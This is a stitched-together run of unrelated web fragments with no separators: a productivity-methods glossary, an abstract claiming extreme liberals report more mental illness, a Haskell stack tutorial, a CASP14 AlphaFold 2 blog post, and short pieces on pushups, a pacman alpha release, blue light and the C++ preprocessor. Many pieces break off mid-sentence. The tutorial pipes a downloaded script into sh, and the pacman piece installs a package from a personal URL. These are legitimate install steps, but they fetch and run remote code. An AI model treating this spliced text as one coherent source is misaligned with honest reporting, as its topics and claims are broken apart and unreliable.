<p>Created by Brian Tracy, ABCDE is a method for setting priorities. Basically assign each task a priority from A to E. A: Very important, must do. B: Important, should do. C: Nice to do, without consequence if skipped. D: Delegate. E: Eliminate.</p>
<h3>Action Method</h3>
<p>Leave every meeting, workshop or other event with a set of concrete tasks that need to be performed, called “action steps”. These should be kept separately from accompanying information (“reference items”). Everything that can’t / shouldn’t be approached right now becomes a “backburner item” to be possibly revived later. The method was developed by Behance. There used to be an online tool that implemented the action method, but it  was discontinued in 2015.</p>
<h3>Agile Results</h3>
<p>The <a href="http://jdmeier.com/agile-results-on-a-page/">Agile Results</a> technique is heavily inspired by software development frameworks like Scrum. At the beginning of the week, identify three wins that you want to achieve. Each day, identify three wins for that day. Use Fridays to recognize three things that are going well and three things to improve. Accompanied by a set of further practices to improve your time management like 30 day improvement sprints, reference collections and more.</p>
<h3>Autofocus</h3>
<p><a href="http://markforster.squarespace.com/autofocus-system/">Autofocus</a> is a to-do list methodology by Mark Forster which tries to use as little structure as possible. Dump everything in a ruled notebook. Scan your list and work on what stands out for as long as you feel like it. Then cross the item off the list. If you haven’t finished it, add it to the bottom again. Repeat. If you pass through a whole page (except the latest page) without anything standing out, dismiss all items on that page.</p>
<h3>Batching / Time Batching / Task Batching</h3>
<p>Work on batches of similar tasks instead of mixing unrelated ones. It reduces friction by minimizing context switching.</p>
<h3>Biological Prime Time</h3>
<p>Track your energy levels and identify your most energetic times of the day. Schedule your most important work for those times. First described by Sam Carpenter in his book <a href="https://www.goodreads.com/book/show/6019060-work-the-system">Work the System</a>.</p>
<h3>Bullet Journal</h3>
<p>A bullet journal combines to-do list, planning and journaling. The name bullet journal comes from the extensive use of bullet(ish) points to structure and mark information.</p>
<h3>COPE</h3>
<p>The Clear-Organized-Productive-Efficient technique helps you to eliminate low-value activities and prioritize everything so that you can focus on the things with the most impact.</p>
<h3>Don’t break the chain</h3>
<p>See Seinfeld Strategy.</p>
<h3>Eat That Frog</h3>
<p>Tackle the biggest and/or most difficult and/or most disliked task first thing in the morning. Then you won’t waste energy or distract yourself the rest of the day because you are secretly dreading that task. <a href="https://www.briantracy.com/blog/time-management/the-truth-about-frogs/">Eat That Frog</a> was created by Brian Tracy who named it after a quote by Mark Twain: “Eat a live frog first thing in the morning and nothing worse will happen to you the rest of the day.”</p>
<h3>Eisenhower Matrix / Box / Method / Principle</h3>
<p>Former U.S. president Dwight D. Eisenhower used to rate his problems by the two criteria urgency and importance. These criteria are commonly used as axis on a 2x2 matrix with 4 quadrants:</p>
<ol>
<li>Urgent and important</li>
<li>Not urgent and important</li>
<li>Urgent but not important</li>
<li>Not urgent and not important</li>
</ol>
<p>The Eisenhower Matrix helps you to better prioritize your tasks and avoid the urgency trap where you fill your day with everything that’s urgent and neglecting the important.</p>
<h3>Final Version</h3>
<p>Start with a list of tasks. Select the first one on the list. Think about which other task from the list you would rather do. Select that one but remember/mark the first. Repeat until you no longer want to do anything before the currently selected task. Then work on the tasks in this chain - but in reverse order! Once you are done with the chain start the process again with the next open task on the list. Reference: <a href="http://archive.constantcontact.com/fs004/1100358239599/archive/1109511856508.html">The Final Version newsletter</a></p>
<h3>Flowtime Technique</h3>
<p>Work on only one task at a time. When you start, write down the time. Continue working on the task until you feel that you need a break. If you are exhausted or can’t focus anymore, take a break. Write down the stop time. Decide how long this break should be and set a timer for it. Repeat.</p>
<h3>Fresh or Fried</h3>
<p>At the end of the day, when your brain is fried, prioritize your tasks for the next day. Schedule important tasks to the beginning of the day, when your brain is still fresh. Schedule less important or easier tasks towards the later parts of the day when your brain fries again.</p>
<p>Reference: <a href="https://thefyslife.com/article/fresh-or-fried-productivity/">Dominate Your Day With the “Fresh or Fried” Prioritization System</a></p>
<h3>Getting Things Done (GTD)</h3>
<p>Getting Things Done is a famous method created by David Allen. It makes extensive use of to-do lists and techniques to manage them. At its core it employs five basic activities to bring structure to your task management:</p>
<ol>
<li>Capture everything: Don’t keep tasks in your head, write everything down.</li>
<li>Clarify: Make sure all your items are clear and actionable.</li>
<li>Organize: Use categories, priorities and due dates to bring structure to your lists.</li>
<li>Review: Frequently go over your lists. Update priorities, remove outdated items, etc.</li>
<li>Engage: Do it.</li>
</ol>
<h3><a href="https://www.focalityapp.com/en/resources/goal-setting/">Goal Setting</a></h3>
<p>Goal setting is the process of defining what you want to achieve in the long-term (or mid-term). Instead of focusing just on tasks, it helps you getting direction in life. If you don’t have clear goals, you are basically adrift. And you hardly get to where you want to be by accident.</p>
<p>We have compiled an <a href="https://www.focalityapp.com/en/resources/goal-setting/">extensive guide to personal goal setting</a> which will help you to understand the topic in depth. Learn why it is important, what types of goals to set, attributes of well-defined goals and much, much more.</p>
<h3>Inbox Zero</h3>
<p>This strategy focuses on managing your email inbox with maximum efficiency. According to its creator, Merlin Mann, the name Inbox Zero does not refer to the number of emails in your inbox, but “how long it takes to use the inbox”. Basically, you run every incoming email through a short process in which you do one of the following things: Delete, delegate, respond, defer (to do later), do (immediately).</p>
<h3>Ivy Lee Method</h3>
<p>This time management strategy has been created in 1918 by productivity consultant Ivy Lee. He recommends writing down six tasks at the end of each day that you want to accomplish the next day. Order them by importance. Then, on the next day, work your way down the list. At the end of the day, move any uncompleted task to the list for the next day. Repeat.</p>
<h3>Medium Method</h3>
<p>Combine the strengths of digital and paper tools. Chad Hall’s <a href="https://todoist.com/productivity-methods/medium-method">Medium Method</a> employs paper notebooks, post-it notes, a task-management app, an online calendar and a note app.</p>
<h3>MIT: Most Important Tasks</h3>
<p>Write down the most important tasks for the next day. Up to three. At the beginning of the day, focus on those and do nothing else until your MITs are completed.</p>
<h3>MoSCow Prioritization</h3>
<p>Borrowed from requirements management this technique helps you prioritize your tasks. Give each task a priority of …</p></div></div></div></div></div></div>

                        <h3>Abstract</h3>
                        
                        
                            <p>It has been claimed that left-wingers or liberals (US sense) tend to more often suffer from mental illness than right-wingers or conservatives. This potential link was investigated using the General Social Survey cumulative cross-sectional dataset (1972-2018). A search of the available variables resulted in 5 items measuring one's own mental illness (e.g., ”Do you have any emotional or mental disability?”). All of these items were weakly associated with left-wing political ideology as measured by self-report, with especially high rates seen for the “extremely liberal” group. These results mostly held up in regressions that adjusted for age, sex, and race. For the variable with the most data (n = 11,338), the difference in the mental illness measure between “extremely liberal” and “extremely conservative” was 0.39 d. Temporal analysis showed that the relationship between mental illness, happiness, and political ideology has existed in the GSS data since the 1970s and still existed in the 2010s. Within-study meta-analysis of all the results found that extreme liberals had a 150% increased rate of mental illness compared to moderates.

<blockquote>
  <p>This post is going to be a quick tour of the essential aspects of <code>stack</code> targeted at beginners. It will not only list commands that should be executed but would try to provide contextual explanations as much as possible. The aim is to give an introduction to <code>stack</code> that is not filled with commands to be memorized but one that can help the beginner to start forming a better understanding of <code>stack</code> so they can explore the tool further on their own.</p>
</blockquote>

<h2 id="clarifying-terms">Clarifying terms</h2>

<p>It is important to have an understanding of some basic terms and concepts when it comes to working and building Haskell programs. This includes understanding what is meant when we say things like <em>Cabal</em>, the difference between <em>Modules, Libraries, Packages</em>, etc. These terms were already explained in the previous post, so instead of reproducing it again here, please take a moment to read the <a href="https://schooloffp.co/2020/08/17/whirlwind-tour-of-cabal-for-beginners.html#clarifying-terms">Clarifying Terms section</a> in the Whirlwind Tour Of Cabal For Beginners post.</p>

<p>One thing to point out regarding the concepts of packages and projects is that <code>stack</code> provides configuration for projects via a file called <code>stack.yaml</code>, while packages are configured via either <code>package.yaml</code> file or <code>.cabal</code> file. These files are covered in more depth in <a href="#creating-a-new-project">Creating a new project</a> section.</p>

<h2 id="what-stack-is">What Stack is</h2>

<p><code>stack</code> is a build tool for Haskell. It is an alternative to <code>cabal-install</code>, but still makes use of cabal the package format and Cabal the library. It has a strong focus on reproducible build plans. It was conceived to solve dependency problems (commonly referred to as cabal hell) that used to plague <code>cabal-install</code>. It does this by providing a curated package set that is guaranteed to always compile.</p>

<blockquote>
  <p>It should be stressed that the cabal hell issue that used to plague cabal-install has mostly been resolved. The solution took a different approach than what <code>stack</code> employed. It made use of an approach similar to what is obtained in Nix. The details of this are not important, just that using either <code>cabal-install</code> or <code>stack</code>is now a matter of preference and UX choices.</p>
</blockquote>

<h2 id="moving-parts">Moving parts</h2>

<p><code>stack</code> also comes with some moving parts and terms that could be confusing to a beginner. In this section, these terms are explained before moving to how to install <code>stack</code>.</p>

<h3 id="curated-package-set">Curated Package Set</h3>

<p>Hackage is Haskell’s central package archive of open-source software. Anyone can upload (and also download) packages from Hackage hence it contains different versions of packages that are not guaranteed to be compatible. A curated package set is then a subset of packages from Hackage which are regularly tested for compatibility. <code>stack</code> makes use of the idea of a curated package set to resolve the problem of incompatible dependencies.</p>

<h3 id="stackage">Stackage</h3>

<p><a href="https://www.stackage.org/">Stackage</a> is the central package archive of open-source software of Haskell packages <strong>that have been curated and tested for compatibility</strong>. Hence the curated package set used by <code>stack</code> is hosted on Stackage. Stackage is spearheaded by folks at <a href="http://www.fpcomplete.com/">fpcomplete</a>, but is still a community effort, hence anyone can also <a href="https://github.com/commercialhaskell/stackage/blob/master/MAINTAINERS.md#adding-a-package">submit packages</a> for inclusion in the curated package set that is hosted on Stackage.</p>

<h3 id="resolver">Resolver</h3>

<p>It is easy to imagine the need for versioning when working with these curated package sets hosted on Stackage. Where a particular version uniquely identifies a particular curated package set and the packages it contains. In <code>stack</code>, the version of a curated package set is referred to or specified as a <em>resolver</em>.</p>

<p>A resolver uniquely identifies the GHC version and the other Haskell packages contained within a package set. Package sets that have been thoroughly tested and would be maintained for a long period are identified by LTS (long term support) resolver version numbers, while package sets that are still in flux are identified by nightly resolvers. The available LTS resolvers can be found <a href="https://www.stackage.org/lts">here</a> while nightly resolvers can be seen <a href="https://www.stackage.org/nightly">here</a>. For example <a href="https://www.stackage.org/lts-16.22">lts-16.22</a>, is a LTS Resolver, while <a href="https://www.stackage.org/nightly-2020-11-19">nightly-2020-11-19</a> is a nightly Resolver.</p>

<blockquote>
  <p>Based on its name, it might be tempting to think of resolver as a piece of software that performs the act of resolution. A better way is to see the resolver as an identifier or a tag. It is a way to refer to a particular curated package set.</p>
</blockquote>

<h3 id="hpack">hpack</h3>

<p>As explained in <a href="https://schooloffp.co/2020/08/17/whirlwind-tour-of-cabal-for-beginners.html#clarifying-terms">Clarifying Terms section</a> Haskell makes use of cabal package format, a text-based, key-value format used to describe a Haskell package. <code>hpack</code> is an alternate format to cabal package format. Instead of a custom key-value text-based format, it makes use of <a href="https://yaml.org/"><code>yaml</code></a>.</p>

<p>So while the cabal package format uses a custom key-value text-based format specified in a file ending with <code>.cabal</code> extension, <code>hpack</code> uses <code>yaml</code> with package descriptions specified in <code>package.yaml</code> file. <code>stack</code>has inbuilt support for <code>hpack</code>. This means <code>stack</code>can parse <code>hpack</code>s’ <code>package.yaml</code> and use it to generate <code>.cabal</code> file.</p>

<p>In summary, you can view <code>stack</code>as a Haskell build tool, that makes use of curated package sets, identified by resolvers and hosted on Stackage, with inbuilt support for <code>hpack</code> as an alternative package specification format.</p>

<h2 id="installing-stack">Installing Stack</h2>

<p>Installing <code>stack</code>is straight forward. On Un*x operating systems, run:</p>

<div><div><pre><code>curl <span>-sSL</span> https://get.haskellstack.org/ | sh
</code></pre></div></div>

<p>On windows, the provided <a href="https://get.haskellstack.org/stable/windows-x86_64-installer.exe">Windows Installer</a> can be used</p>

<p>To confirm <code>stack</code>is properly installed run <code>stack --version</code> which will give an output similar to this:</p>

<div><div><pre><code><span>$ </span>stack <span>--version</span>
Version 2.3.3, Git revision cb44d51bed48b723a5deb08c3348c0b3ccfc437e x86_64 hpack-0.33.0
</code></pre></div></div>

<blockquote>
  <p>Note that you do not need to install GHC separately when using <code>stack</code>. <code>stack</code>handles getting the version of GHC needed for each project created. This is also one of the ways in which <code>stack</code>differs from <code>cabal-install</code> which requires GHC to be separately downloaded and installed. So <code>stack</code>not only takes care of resolving dependencies, compiling Haskell code, it also handles the management of the toolchain required to do this, and GHC is included in the toolchain.</p>
</blockquote>

<h2 id="creating-a-new-project">Creating a new project</h2>

<p>Now we have <code>stack</code>installed, the next thing to do is to create a new Haskell project. Doing this is straightforward. To create a new project, run <code>stack new</code>.</p>

<p>Doing so will produce an output similar to this:</p>

<div><div><pre><code><span>$ </span>stack new firstproject
Downloading template <span>"new-template"</span> to create project <span>"firstproject"</span> <span>in </span>firstproject/ ...

The following parameters were needed by the template but not provided: author-name
You can provide them <span>in</span> /Users/schooloffp/.stack/config.yaml, like this:
templates:
  params:
    author-name: value
Or you can pass each one as parameters like this:
stack new firstproject new-template <span>-p</span> <span>"author-name:value"</span>

The following parameters were needed by the template but not provided: author-email, author-name, category, copyright, github-username
You can provide them <span>in</span> /Users/schooloffp/.stack/config.yaml, like this:
templates:
  params:
    author-email: value
    author-name: value
    category: value
    copyright: value
    github-username: value
Or you can pass each one as parameters like this:
stack new firstproject new-template <span>-p</span> <span>"author-email:value"</span> <span>-p</span> <span>"author-name:value"</span> <span>-p</span> <span>"category:value"</span> <span>-p</span> <span>"copyright:value"</span> <span>-p</span> <span>"github-username:value"</span>

Looking <span>for</span> .cabal or package.yaml files to use to init the project.
Using cabal packages:
- firstproject/

Selecting the best among 18 snapshots...

<span>*</span> Matches lts-16.22

Selected resolver: lts-16.22
Initialising configuration using resolver: lts-16.22
Total number of user packages considered: 1
Writing configuration to file: firstproject/stack.yaml
All <span>done</span><span>.</span>
/Users/schooloffp/.stack/templates/new-template.hsfiles:    3.72 KiB downloaded...
</code></pre></div></div>

<p>The above command will create a directory named <code>firstproject</code> with will contain the source files for the project.</p>

<blockquote>
  <p>The above command creates a project based on a default template which dictates the default files and configuration that will be created. It should be noted that it is possible to pass an extra option together with <code>new</code> that specifies the template that <code>stack</code>should use to create a new project. When the template option is left out, <code>stack</code>uses the <code>new-template</code> template by default. Hence <code>stack new firstproject</code> is same as running <code>stack new firstproject new-template</code>. Run <code>stack templates</code> to see the available templates.</p>
</blockquote>

<p>The state of the directory after running <code>stack new firstproject</code> can be seen:</p>

<div><div><pre><code><span>$ </span>tree firstproject/
firstproject/
├── ChangeLog.md
├── LICENSE
├── README.md
├── Setup.hs
├── app
│   └── Main.hs
├── firstproject.cabal
├── package.yaml
├── src
│   └── Lib.hs
├── stack.yaml
└── <span>test</span>
    └── Spec.hs
</code></pre></div></div>
<p>Let’s take a pause to talk about the files generated after running the <code>stack new</code> command.</p>

<h3 id="changelogmd">ChangeLog.md</h3>

<p>As is evident in the name, this is a markdown file that should be used to capture the revision history for the project.</p>

<h3 id="license">LICENSE</h3>

<p>This is where the license governing the project is specified, as also evident in the name.</p>

<h3 id="readmemd">README.md</h3>

<p>The well-known README file.</p>

<h3 id="setuphs">Setup.hs</h3>
<p>The <code>Setup.hs</code> file comes in handy in the scenario where one needs to circumvent tools like <code>cabal-install</code> or <code>stack</code>for direct usage of the Cabal library when compiling Cabal packages. The <code>Setup.hs</code> is, in essence, a runnable Haskell program that can be further configured and used to compile Cabal packages.</p>

<p>This is an exceptional use case. Everyday Haskell development would …</p></div></div>

<p><em>Disclaimer: this post is an opinion piece based on the experience and opinions derived from attending the CASP14 conference as a doctoral student researching protein modelling.

Neither the Oxford Protein Informatics Group nor I accept any responsibility for the content of this post.</em></p>



<p>You might have heard it from the <a href="https://www.nature.com/articles/d41586-020-03348-4">scientific</a> or <a href="https://www.nytimes.com/2020/11/30/technology/deepmind-ai-protein-folding.html">regular press</a>, perhaps even from <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">DeepMind’s own blog</a>. Google ‘s AlphaFold 2 indisputably won the <a href="https://predictioncenter.org/casp14/index.cgi">14<sup>th</sup> Critical Assessment of Structural Prediction</a> competition, a biannual blind test where computational biologists try to predict the structure of several proteins whose structure has been determined experimentally — yet not publicly released. Their results are so incredibly accurate that many have hailed this code as the solution to the long-standing protein structure prediction problem.</p>



<p>Protein structure is at the core of biochemistry, and has profound implications for medicine and technology. Establishing the structure of a protein is a bottleneck in <a href="https://en.wikipedia.org/wiki/Drug_design#Structure-based">structure-based drug discovery</a>, and accurate structure prediction is expected to improve the productivity of pharmaceutical research pipelines (although it is only one factor, and we will need to get other things right before truly revolutionary changes happen — check Derek Lowe’s posts <a href="https://blogs.sciencemag.org/pipeline/archives/2019/09/25/whats-crucial-and-what-isnt">here</a> and <a href="https://blogs.sciencemag.org/pipeline/archives/2020/12/01/the-big-problems">here</a>). Structural information of proteins is also essential in biology, where it helps to elucidate function — many key papers in biochemistry derive insight from experimental advances in structure determination. </p>



<p>Given the importance of the problem, and the wide network of resources that have slowly been advancing for decades, I think nobody was expecting that a solution would be presented too quickly. I myself decided to focus my PhD research in the field of structure prediction, thinking like many others that several years of work across many research lines would be necessary before we could achieve something close to a solution. I may now need to change topics.</p>



<p>How much of the press release is true, what has actually happened, and how significant is it? There has been endless discussion about this topic in multiple forums. Frankly, I haven’t been able to think about anything else for the past 72 hours. In an attempt to clear my own thoughts, I have decided to write this blog post detailing everything I have learned since my scientific world was turned upside down around 3 pm GMT on Monday. I hope this is useful for my fellow protein bioinformaticians who could not attend CASP14, but also to anyone who wants to hear a little bit more about this topic.</p>



<p>Please bear in mind that my report of the CASP14 assessment and conference will necessarily be interspersed with conjecture. The details of how <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">AlphaFold 2</a> works are still unknown, and we may not have full access to them until their paper is peer-reviewed (which may take more than a year, based on their CASP13 paper). The magnitude of the breakthrough is undeniable — but we need more details to gauge its potential impact.</p>



<p>This is going to be a long post. Don’t say I didn’t warn you.</p>



<h2>How good is AlphaFold 2, exactly?</h2>



<p>Astoundingly so.</p>



<p>Let me tell you the story as it happened last Monday. A handful of hours before the start of the CASP14 meeting — around noon GMT — the organisers released the results of the assignment. Almost immediately, comments started to circulate around Twitter. This is the image everyone was sharing:</p>

One group, 427, named AlphaFold 2, shows an incredible improvement with respect to the second best group, 473 (BAKER). This figure was obtained from the official CASP14 webpage on Tuesday 1st December, 2020.</figcaption></figure></div>



<p>This bar plot describes the sum of <a href="https://en.wikipedia.org/wiki/Standard_score">Z-scores</a> representing the predictions from the different groups. Remember that the Z-score is just the difference of a sample’s value with respect to the population mean, divided by the standard deviation; a high value represents a large deviation from the mean, and is commonly used as a outlier detection procedure. In other words, the groups that are markedly better than the average will have larger Z-scores. In this graph we see that one group performs a lot better than the rest: Group 427, whose average Z-score was around 2.5 when considering all targets, and rose to 3.8 in the hardest ones. If this was an intelligence test, AlphaFold 2 would score an <a href="https://en.wikipedia.org/wiki/Intelligence_quotient">intelligence quotient</a> (IQ) above 160.</p>



<p>If the relative comparison is astounding, the actual performance is just as impressive. I am going to consider a typical metric in structural biology, the <a href="https://en.wikipedia.org/wiki/Root-mean-square_deviation_of_atomic_positions">root-mean-square deviation (RMSD) of atomic positions</a>. If you are not much of a protein folder, these numbers may not say much to you. Don’t worry — in next section I will show a few graphical examples. Just keep in mind that (1) a lower RMSD represents a better predicted structure, and that (2) most experimental structures have a resolution around 2.5 Å (<strong>updated 8th Dec:</strong> although, as many have pointed out in Twitter, this is an apples to oranges comparison). Taking this into consideration, about a third (36%) of Group 427’s submitted targets were predicted with a root-mean-square deviation (RMSD) under 2 Å, and 86% were under 5 Å, with a total mean of 3.8 Å.</p>

<p>We were still digesting this information when the conference started and, oh boy, did we suffer the first half an hour. Claims that this year’s competition was “a little unusual” were followed by suggestions that one particular group had produced impressive results. Finally, John Moult, who has chaired every CASP since 1994, masterfully delivered a nail-biting exposition of the history of the competition, slowly feeding us information until he finally showed the graph we were all expecting. Here it is:</p>

The dark orange line (CASP14_serv) corresponds to the predictions made by fully automated servers, the olive green line (CASP14_w/o427) includes all predictions assisted by humans except for the highest performing group; and the black line (CASP14) represents the predictions by the best performing team: Group 427, or AlphaFold 2. This plot uses the GDT_TS score, where 100 represents perfect results and 0 is a meaningless prediction.</figcaption></figure></div>



<p>As a rule of thumb, a GDT_TS around 60% represents a “correct fold”, meaning that we have an idea of how the protein folds globally; and over 80% we start seeing side chains that closely resemble the model. As you can see, AlphaFold 2 achieves this objective for all but a small percentage of the tasks.</p>



<p>And then, after three decades of competitions, the assessors declared that AlphaFold 2 had succeeded in solving a challenge open for 50 years: to develop a method that can accurately, generally and competitively predict a protein structure from its sequence (or, well, a multiple sequence alignment, as we will see later). There are caveats and edge cases, as in any application — but the magnitude of the breakthrough, as well as its potential impact, are undeniable.</p>



<p>The story does not end there. The models produced by AlphaFold 2 were so good that in some cases defied the results of the experiment. I will provide two brief examples, based on examples mentioned in the conference. The first example comes from the group of <a href="http://www.chem.umd.edu/faculty-staff-directory/facultydirectory/osnat-herzberg">Osnat Herzberg</a>, who were studying a phage tail protein. After appreciating the excellent agreement of DeepMind’s model with their structure, they noticed that they had a different assignment for a cis-proline. Upon reviewing the analysis, they realised they had made a mistake in the interpretation and corrected it.</p>



<p>The second comes from the group of <a href="https://www.chemie.uni-hamburg.de/en/institute/bc/arbeitsgruppen/tidow/personen/tidow-henning.html">Henning Tidow</a>, who was studying an integral membrane protein, the reductase FoxB (apparently related to iron uptake in Gram-negative bacteria). Prof. Tidow’s group worked on this model for about two years, trying different methodologies to solve the crystal structure, including <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5947774/">experimental phasing</a> methods. When they were given the models from DeepMind’s prediction, they managed to solve the problem by <a href="https://en.wikipedia.org/wiki/Molecular_replacement#:~:text=Molecular%20replacement%20(or%20MR)%20is,the%20diffraction%20data%20is%20derived.">molecular replacement</a> in a matter of hours.</p>



<p>There is one last point to clear. Some people have wondered if Google’s incredible success is not perhaps related to an easier set of target proteins this year. This is, <em>per se</em>, a difficult claim to sustain (after all, wouldn’t other groups with much more experience have also benefited from this?), but to disprove this point the assessors have concluded that the targets for CASP14 were the most difficult to date, based on the similarity of existing protein structures to the targets:</p>

On both counts, CASP14 includes the most difficult free-modelling (FM) targets yet provided. TBM stands for Template Based Models.</figcaption></figure></div>



<p>There are still many interesting points of discussion. Many will argue that the set of targets studied at CASP14 is not representative of <em>all</em> interesting structural prediction problems — and they will be right. And, yes, certainly there are some problems where AlphaFold 2 hasn’t performed that well. I will give you my thoughts on some of the caveats later, when we near the end of this blog post. But, for now, let’s be clear on something: AlphaFold 2 is a tool that can solve the protein structure prediction <em>for a very significant number of targets</em>.</p>



<h2>How does this compare to other methods?</h2>



<p>I might have convinced you that AlphaFold 2 is a massive breakthrough. Now it is time …</p></div></div>

              <p>The study linked below reports on an interesting kind of litmus test for heart health in middle aged men: if you can do forty pushups, you’re much less likely to have heart problems over the next ten years.</p>
<p>The usual warnings apply about correlation not implying causation. It’s possible that men who can do forty pushups typically embrace other healthy living habits or enjoy some genetic advantage. Thus, a sudden intense micro-focus on pushups may not be the answer.</p>
<p>Nevertheless, the long-term physical benefits of strength training are well established. I found <a href="https://www.coursera.org/learn/hacking-exercise-health">Hacking Exercise for Health</a> to be a very informative and motivating short course on this topic.</p>

		<p>We have been slowly working towards the next pacman release. The major change for this release is the implementation of parallel downloads.  Check out this video:</p>

<p>It is time for this feature to receive some wider testing. Grab the package using:<br>
<code>pacman -U http://allanmcrae.com/packages/pacman-6.0.0alpha1-1-x86_64.pkg.tar.zst</code></p>
<p>This should be “safe” – there are quite a number of us using this code for our system management.  There may be issues with AUR helpers due to ABI changes… If you are concerned, keep a copy of the repo package around to reinstall if necessary.</p>
<p>There are still a few <a href="https://bugs.archlinux.org/task/67811">issues</a> with the downloader we will fix before release.  If one of your mirrors is broken, you will be spammed with error messages at the end of the downloads.  And <tt>TotalDownload</tt> does not work.  But otherwise, it is good to go!</p>
<p>Report any bugs to the <a href="https://bugs.archlinux.org/index.php?project=3">bug tracker</a>.</p>

Combined, this spectrum of coloured light rays creates sunlight called “white light”.</span></p><p id="viewer-bc2fl"><span>Without getting into the details, there is an inverse relationship between the wavelength of light rays and the amount of energy they contain.</span></p><p id="viewer-825iu"><span>This means that the rays on the red end of the visible light spectrum have longer wavelengths and, therefore, less energy. On the other hand, rays on the blue end of the spectrum have shorter wavelengths and more energy.</span></p><p id="viewer-15gnj"><span>Not all colours of light have the same effect. Blue wavelengths are beneficial during daylight hours because they boost your mood, attention and reaction times, however, studies suggest they're more disruptive at night.</span></p><h2 id="viewer-65vu6"><span>What exposes you to Blue Light?</span></h2><p id="viewer-bi01v"><span>Although sunlight is the biggest source of Blue Light that you'll be subjected too, here are some of the others:</span></p><ul><li id="viewer-cugnd"><p>LED light</p></li><li id="viewer-di5pk"><p>Fluorescent light</p></li><li id="viewer-ads93"><p>Flat-screen LED televisions</p></li><li id="viewer-7b2ak"><p>Computer monitors</p></li><li id="viewer-ep37g"><p>Smartphones and tablet screens</p></li></ul><p id="viewer-5valn"><span>Although you receive a lot less Blue Light from these sources than from the sun, it's the fact that we tend to use them more and more before going to bed that is of concern.</span></p><h3 id="viewer-qt2o"><span><strong><span>Suggested Articles:</span></strong></span></h3><ul><li id="viewer-apq6a"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a><strong>

<p>The C++, eh C, preprocessor is wonderful.</p>
<p>Well, no - it isn’t wonderful.</p>
<p>It is a primitive text replacement tool that must be used to work with C++.
But is “must” really true?
Most of the usage has become obsolete thanks to new and better C++ language features.
And many more features like modules will come soon™.
So can we get rid of the preprocessor?
And if so, how can we do it?</p>
<a id="more"></a>
<p>Much of the preprocessor use is already bad practice:
Don’t use it for symbolic constants, don’t use it for inline functions etc.</p>
<blockquote>
<p>As this gained a lot of traction, let me clarify something:
I’m not advocating for removing the preprocessor with this post.
Some people in the C++ community and many on the standardization committee want to do that, however,
so I wanted to explore the feasibility.</p>
</blockquote>
<p>But there still a few ways it is used in idiomatic C++.
Let’s go through them and see what alternative we have.</p>

<p>Let’s start with the most common usage:
<code>#include</code> a header file.</p>
<h3 id="why-is-the-preprocessor-needed">Why is the preprocessor needed?</h3>
<p>In order to compile a source file, the compiler needs to see the declarations of all functions that are being called.
So if you define a function in one file,
and want to call it in another, you have to declare it in that file as well.
Only then can the compiler generate the appropriate code to call the function.</p>
<p>Of course, manually copying the declaration can lead to errors:
If you change the signature you have to change all declarations as well.
So, instead of manually copying the declarations,
you write them in a special file - the header file,
and let the preprocessor copy it for you with <code>#include</code>.
Now you still need to update all declarations, but just in one place.</p>
<p>But plain text inclusion is dumb.
It can sometimes happens that the same file gets included twice,
which leads to two copies of that file.
This is no problem for function declarations,
but if you have class definitions in an header file,
that’s an error.</p>
<p>To prevent that, you have to use include guards or the non-standard <code>#pragma once</code>.</p>
<h2 id="how-can-we-replace-it">How can we replace it?</h2>
<p>With current C++ features, we can’t (without resorting to copy pasta).</p>
<p>But with the <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2017/n4647.pdf">Modules TS</a> we can.
Instead of providing header files and source files,
we can write a module and <code>import</code> that.</p>
<p>If you want to learn more about modules, I highly recommend the <a href="https://www.youtube.com/watch?v=Wjvh127abfw">most recent CppChat</a>.</p>
<h2 id="conditional-compilation">Conditional Compilation</h2>
<p>The second most common job of the preprocessor is conditional compilation:
Change the definitions/declarations by defining or not defining a macro.</p>
<h3 id="why-is-the-preprocessor-needed-1">Why is the preprocessor needed?</h3>
<p>Consider the situation where you’re writing a library that provides a function <code>draw_triangle()</code>
which draws a single triangle on the screen.</p>
<p>Now the declaration is straightforward:</p>
<div><pre><code data-lang="cpp"><span>// draws a single triangle
</span><span></span><span>void</span> <span>draw_triangle</span><span>();</span>
</code></pre></div><p>But the implementation of the function changes depending on your operating system, window manager, display manager
and/or moon phase (for exotic window manager).</p>
<p>So you need something like this:</p>
<div><pre><code data-lang="cpp"><span>// use this one for Windows
</span><span></span><span>void</span> <span>draw_triangle</span><span>()</span>
<span>{</span>
    <span>// create window using the WinAPI 
</span><span></span>    <span>// draw triangle using DirectX
</span><span></span><span>}</span>

<span>// use this one for Linux
</span><span></span><span>void</span> <span>draw_triangle</span><span>()</span>
<span>{</span>
    <span>// create window using X11
</span><span></span>    <span>// draw triangle using OpenGL
</span><span></span><span>}</span>
</code></pre></div><p>The preprocessor helps there:</p>
<div><pre><code data-lang="cpp"><span>#if _WIN32
</span><span></span>    <span>// Windows triangle drawing code here 
</span><span></span><span>#else
</span><span></span>    <span>// Linux triangle drawing code here
</span><span></span><span>#endif
</span></code></pre></div><p>The code in the branch that is not taken will be deleted before compilation,
so we won’t get any errors about missing APIs etc.</p>
<h3 id="how-can-we-replace-it-1">How can we replace it?</h3>
<p>C++17 adds <code>if constexpr</code>, this can be used to replace simple <code>#if … #else</code>:</p>
<p>Instead of this:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>do_sth</span><span>()</span>
<span>{</span>
    <span>#if DEBUG_MODE
</span><span></span>        <span>log</span><span>();</span>
    <span>#endif
</span><span></span>    <span>…</span>
<span>}</span>
</code></pre></div><p>We can write this:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>do_sth</span><span>()</span>
<span>{</span>
    <span>if</span> <span>constexpr</span> <span>(</span><span>DEBUG_MODE</span><span>)</span>
    <span>{</span>
        <span>log</span><span>();</span>
    <span>}</span>

    <span>…</span>
<span>}</span>
</code></pre></div><p>If <code>DEBUG_MODE</code> is <code>false</code>, then the branch will not be compiled properly,
it will only check for syntax errors, similar to the checking done for a not yet instantiated template.</p>
<blockquote>
<p>This is not correct, as was pointed out.
It will still be fully checked if outside a template.
It doesn’t matter here though, as it still doesn’t have any runtime overhead.</p>
</blockquote>
<p>This is even better than <code>#if</code> as it will spot obvious errors in the code without checking all macro combinations.
Another benefit with <code>if constexpr</code> is that <code>DEBUG_MODE</code> can now be a normal <code>constexpr</code> variable,
instead of a constant coming from a macro expansion.</p>
